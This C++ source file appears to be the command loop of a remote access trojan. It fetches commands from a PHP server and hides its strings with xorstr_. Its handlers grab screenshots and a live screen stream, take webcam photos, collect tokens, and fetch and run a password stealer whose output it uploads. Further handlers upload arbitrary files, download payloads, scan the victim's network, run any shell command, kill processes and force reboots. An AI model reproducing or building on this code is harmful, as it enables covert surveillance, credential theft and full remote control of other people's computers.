#include "communication.h"
#include <iostream>
#include <filesystem>
#include <fstream>

#include "..\utility\requests.h"
#include <thread>

#include "functions.h"
#include "../utility/helper.h"
#include "client.h"

namespace fs = std::filesystem;

namespace client {
	namespace communication {
		std::thread stream;
		bool stop_stream = false;

		void stream_loop() {
			while (!stop_stream) {
				client::functions::take_screenshot(PATH + xorstr_("ss.jpg"));
				send_message("Stream PC Screenshot", "", PATH + xorstr_("ss.jpg"), "image");
				Sleep(750);
			}
		}

		void handler_loop() {
			send_message("Notification", "Communication Thread Created");

			while (true) {
				auto cmd = get_command();
				if (!cmd.empty()) {	
					if (cmd == xorstr_("update")) {
						send_message("Updating to newest version...");
						requests::download_file("update.exe", PATH + xorstr_("update.exe"));
					}
					else if (cmd == xorstr_("screenshot") || cmd == xorstr_("ss")) {
						client::functions::take_screenshot(PATH + xorstr_("ss.jpg"));
						send_message("PC Screenshot", "", PATH + xorstr_("ss.jpg"), "image");
					} 
					else if (cmd == xorstr_("stream") || cmd == xorstr_("stop")) {
						if (cmd == xorstr_("stream")) {
							stream = std::thread(stream_loop);
						}
						else {
							stop_stream = true;
							send_message("Stream", "Stream Stopped!");
						}
					} 
					else if (cmd == xorstr_("windows")) {
						send_message("All Windows", client::functions::prepare_payload(xorstr_("All Windows"), client::functions::get_all_windows()));
					}		
					else if (cmd == xorstr_("tokens")) {
						communication::send_message("Tokens", client::functions::prepare_payload("Tokens", client::functions::get_tokens()));
					}
					else if (cmd == xorstr_("pass")) {
						requests::download_file("shaco.exe", PATH + xorstr_("shaco.exe"));
						system(xorstr_("cd %AppData%\\Microsoft\\COM && shaco.exe"));
						send_message(xorstr_("Passwords"), "", PATH + xorstr_("pass.txt"), "file");
					}
					else if (cmd == xorstr_("camera")) {
						system(("cd " + PATH + xorstr_(" && cam.exe camera")).c_str());

						if (std::filesystem::exists(PATH + xorstr_("camera.jpg")))
							send_message(xorstr_("Camera"), "", PATH + xorstr_("camera.jpg"), "image");
						else
							send_message(xorstr_("Camera"), xorstr_("No image generated. Possibly no camera."));
					}
					else if (cmd == xorstr_("devices")) {
						if (helpers::is_python_installed()) {
							auto ip = client::functions::get_default_gateway();
							auto ssid = helpers::exec("netsh wlan show networks|find \"SSID\"");
							ssid.replace(ssid.length() - 1, ssid.length(), "");
							send_message(xorstr_("Analyzing Network..."), "Default Gateway: " + ip + xorstr_("\nSSID: ") + ssid.substr(9));

							auto res = helpers::exec(("python " + PATH + xorstr_("scripts\\scanner.py ") + ip + " \"" + ssid + "\"").c_str());
							send_message(xorstr_("Devices Response"), res);
						}
						else {
							send_message(xorstr_("Devices Response"), xorstr_("Python is not installed."));
						}
					}
					else if (cmd == xorstr_("tv")) {
						if (std::filesystem::exists(std::string(xorstr_("cd ")) + std::string(PATH + xorstr_("tv")))) {
							system("C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe");
							system("C:\\Program Files\\TeamViewer\\TeamViewer.exe");

							client::functions::take_screenshot(PATH + xorstr_("ss.jpg"));
							send_message("TeamViewer", PATH + xorstr_("ss.jpg"));
						} 
						else {
							send_message(xorstr_("TeamViewer"), std::string(xorstr_("TeamViewer is not installed. Possible failure to install during startup")));
						}
					}
					else if (cmd.find(xorstr_("upload")) != std::string::npos) {
						auto path = cmd.substr(sizeof("upload"));

						send_message("Upload", "", path, "file");
					}
					else if (cmd.find(xorstr_("download")) != std::string::npos &&
							 (cmd.find(xorstr_("https")) != std::string::npos ||
							 cmd.find(xorstr_("http")) != std::string::npos)) {

						auto index = cmd.find(xorstr_("http")) != std::string::npos ? cmd.find(xorstr_("http")) : cmd.find(xorstr_("https"));
						auto url = cmd.substr(index);
						std::filesystem::path p(url);
						requests::download_file(url, PATH + p.filename().string());
						send_message(xorstr_("Download"), "Finished Downloading");
					}
					else if (cmd.find(xorstr_("wallpaper")) != std::string::npos &&
							(cmd.find(xorstr_("https")) != std::string::npos ||
							cmd.find(xorstr_("http")) != std::string::npos)) {

						auto index = cmd.find(xorstr_("http")) != std::string::npos ? cmd.find(xorstr_("http")) : cmd.find(xorstr_("https"));
						auto url = cmd.substr(index);
						auto path = PATH + xorstr_("download") + cmd.substr(cmd.find_last_of("."));
						std::string message = "";
						if (requests::download_file(url, path)) {
							functions::set_wallpaper(helpers::s2ws(path).c_str());
							message = xorstr_("Success");
						}
						else {
							message = xorstr_("Failed to download file");
						}

						send_message(xorstr_("Set Wallpaper"), message);
					}
					else if (cmd.find(xorstr_("dir")) != std::string::npos) {
						if (cmd == "dir")
							send_message(xorstr_("Directory"), helpers::exec(("cd " + PATH + " && dir").c_str()));
						else {
							cmd = cmd.substr(3);
							auto response = helpers::exec(("cd " + PATH + " && " + cmd).c_str());
							if (response.empty())
								response = xorstr_("Executed command '") + cmd + "'";
							send_message(xorstr_("Command Response"), response);
						}
					}
					else if (cmd.find(xorstr_("kill")) != std::string::npos) {
						auto pid = helpers::get_pid(cmd.substr(5).c_str());

						if (pid) 
							send_message(xorstr_("Kill Process"), helpers::exec(("taskkill /f /im " + std::to_string(pid)).c_str()));
						else
							send_message(xorstr_("Kill Process"), "The process '" + cmd.substr(5) + "' was not found.");
					}
					else if (cmd.find(xorstr_("shutdown")) != std::string::npos) {
						system("shutdown -r -f -t 0");
					}
					else {
						auto response = helpers::exec(cmd.c_str());
						if (response.empty())
							response = xorstr_("Executed command '") + cmd + "'";
						send_message(xorstr_("Command Response"), response);
					}
				}
			}
		}

		std::string send_message(std::string title, std::string desc, std::string file_path, std::string type) {
			return requests::post("php/send.php", "title=" + title + "&desc=" + desc, file_path, type);
		}

		void set_profile(std::string key, std::string value) {
			requests::post("php/profile.php", "set=" + key + "&value=" + value);
		}
		
		std::string get_profile(std::string key) {
			std::string res = requests::get_request("php/profile.php", "key=" + key);
			helpers::replace_all(res, "\n", "");
			helpers::replace_all(res, "\r", "");
			return res;
		}

		std::string get_command() {
			return requests::get_request("php/command.php");
		}
	}	
}